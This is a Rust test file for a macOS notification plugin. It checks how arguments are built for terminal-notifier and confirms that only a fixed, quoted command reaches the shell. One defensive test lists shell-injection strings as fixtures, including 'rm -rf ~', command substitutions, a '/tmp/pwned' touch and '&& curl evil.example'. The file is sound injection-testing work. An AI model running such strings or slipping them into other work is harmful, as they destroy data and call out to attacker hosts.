//! The argv we hand terminal-notifier, and the one string that reaches a
//! shell.

mod support;

use std::path::{Path, PathBuf};

use herdr_nudge::cli::JobId;
use herdr_nudge::notifier::{
    BadBinaryPath, Notifier, Post, binary_path, click_command, group_for, post_args, remove_args,
};
use support::Spy;

fn job() -> JobId {
    JobId::parse("0123456789abcdef").expect("16 hex")
}

fn post_with<'a>(title: &'a str, message: &'a str, execute: &'a str) -> Post<'a> {
    Post {
        title,
        subtitle: Some("w1"),
        message,
        group: "herdr-nudge-w1:p1",
        content_image: None,
        sound: false,
        execute,
    }
}

#[test]
fn the_notifier_lives_in_the_bundle_inside_the_plugin() {
    assert_eq!(
        binary_path(Path::new("/plugins/herdr-nudge")),
        PathBuf::from(
            "/plugins/herdr-nudge/vendor/HerdrNudge.app/Contents/MacOS/terminal-notifier"
        ),
        "notifier path under the plugin root"
    );
}

#[test]
fn a_group_is_the_pane_id() {
    assert_eq!(group_for("w1:p1"), "herdr-nudge-w1:p1", "group for w1:p1");
}

#[test]
fn two_panes_never_share_a_group() {
    assert_ne!(
        group_for("w1:p1"),
        group_for("w1:p11"),
        "w1:p1 and w1:p11 must not collide"
    );
}

#[test]
fn the_click_command_is_our_path_and_a_job_id() {
    assert_eq!(
        click_command(Path::new("/plugins/herdr-nudge/bin/herdr-nudge"), &job()),
        Ok("'/plugins/herdr-nudge/bin/herdr-nudge' --click 0123456789abcdef".to_owned()),
        "the -execute template"
    );
}

/// macOS runs `-execute` through a shell, so a path we cannot quote safely is
/// refused rather than escaped.
#[test]
fn a_path_with_a_single_quote_is_refused() {
    let path = Path::new("/Users/o'brien/plugins/bin/herdr-nudge");
    assert_eq!(
        click_command(path, &job()),
        Err(BadBinaryPath::Quote(path.to_owned())),
        "a single quote in our own path"
    );
}

#[test]
fn a_relative_path_is_refused() {
    let path = Path::new("bin/herdr-nudge");
    assert_eq!(
        click_command(path, &job()),
        Err(BadBinaryPath::Relative(path.to_owned())),
        "the click runs from an unknown directory"
    );
}

/// The whole point of the job file: nothing from the event can reach the
/// shell, however the event is shaped.
#[test]
fn hostile_event_text_never_reaches_the_execute_value() {
    let nasty = [
        "'; rm -rf ~; echo '",
        "$(whoami)",
        "`id`",
        "a\nb",
        "\"; touch /tmp/pwned; \"",
        "w1:p1'",
        "$HOME",
        "&& curl evil.example",
    ];
    let execute = click_command(Path::new("/plugins/bin/herdr-nudge"), &job()).expect("clean path");

    for text in nasty {
        let post = post_with(text, text, &execute);
        let args = post_args(&post);
        let sent = Spy::arg_after(&args, "-execute").expect("-execute is present");
        assert_eq!(
            sent, "'/plugins/bin/herdr-nudge' --click 0123456789abcdef",
            "-execute changed when the title and message were {text:?}"
        );
        // And the hostile text did travel, as its own argv element.
        assert_eq!(
            Spy::arg_after(&args, "-title").as_deref(),
            Some(text),
            "the title itself should still be sent verbatim"
        );
    }
}

#[test]
fn the_execute_value_matches_the_template_exactly() {
    let execute = click_command(Path::new("/plugins/bin/herdr-nudge"), &job()).expect("clean path");
    let rest = execute
        .strip_prefix('\'')
        .and_then(|s| s.split_once("' --click "))
        .expect("the -execute value should be '<path>' --click <id>");
    let (path, id) = rest;
    assert!(
        !path.contains('\''),
        "the quoted path holds no quote: {path}"
    );
    assert_eq!(id.len(), 16, "the job id is 16 characters: {id}");
    assert!(
        id.bytes()
            .all(|b| b.is_ascii_digit() || (b'a'..=b'f').contains(&b)),
        "the job id is lowercase hex: {id}"
    );
}

#[test]
fn no_subtitle_leaves_the_flag_out() {
    let execute = "'/bin/x' --click 0123456789abcdef";
    let mut post = post_with("t", "m", execute);
    post.subtitle = None;
    let args = post_args(&post);
    assert!(
        !args.iter().any(|a| a == "-subtitle"),
        "subtitle None: {args:?}"
    );
}

#[test]
fn a_logo_and_a_sound_are_added_only_when_asked_for() {
    let execute = "'/bin/x' --click 0123456789abcdef";
    let bare = post_args(&post_with("t", "m", execute));
    assert!(
        !bare.iter().any(|a| a == "-contentImage" || a == "-sound"),
        "no image or sound by default: {bare:?}"
    );

    let logo = PathBuf::from("/plugins/icons/agents/claude.png");
    let mut post = post_with("t", "m", execute);
    post.content_image = Some(&logo);
    post.sound = true;
    let full = post_args(&post);
    assert_eq!(
        Spy::arg_after(&full, "-contentImage").as_deref(),
        Some("/plugins/icons/agents/claude.png"),
        "the agent logo goes in -contentImage"
    );
    assert_eq!(
        Spy::arg_after(&full, "-sound").as_deref(),
        Some("default"),
        "-sound default"
    );
}

#[test]
fn removing_withdraws_one_group() {
    assert_eq!(
        remove_args("herdr-nudge-w1:p1"),
        vec!["-remove".to_owned(), "herdr-nudge-w1:p1".to_owned()],
        "remove argv"
    );
}

#[test]
fn posting_runs_the_bundled_binary_with_the_composed_argv() {
    let spy = Spy::default();
    let binary = PathBuf::from("/plugins/vendor/HerdrNudge.app/Contents/MacOS/terminal-notifier");
    let notifier = Notifier {
        binary: &binary,
        spawner: &spy,
    };
    notifier
        .post(&post_with(
            "Claude · blocked",
            "waiting",
            "'/bin/x' --click 0123456789abcdef",
        ))
        .expect("spy accepts the spawn");

    let argv = spy.only();
    assert_eq!(argv[0], binary.display().to_string(), "program run");
    assert_eq!(
        Spy::arg_after(&argv, "-title").as_deref(),
        Some("Claude · blocked"),
        "title in argv"
    );
    assert_eq!(
        Spy::arg_after(&argv, "-group").as_deref(),
        Some("herdr-nudge-w1:p1"),
        "group in argv"
    );
}
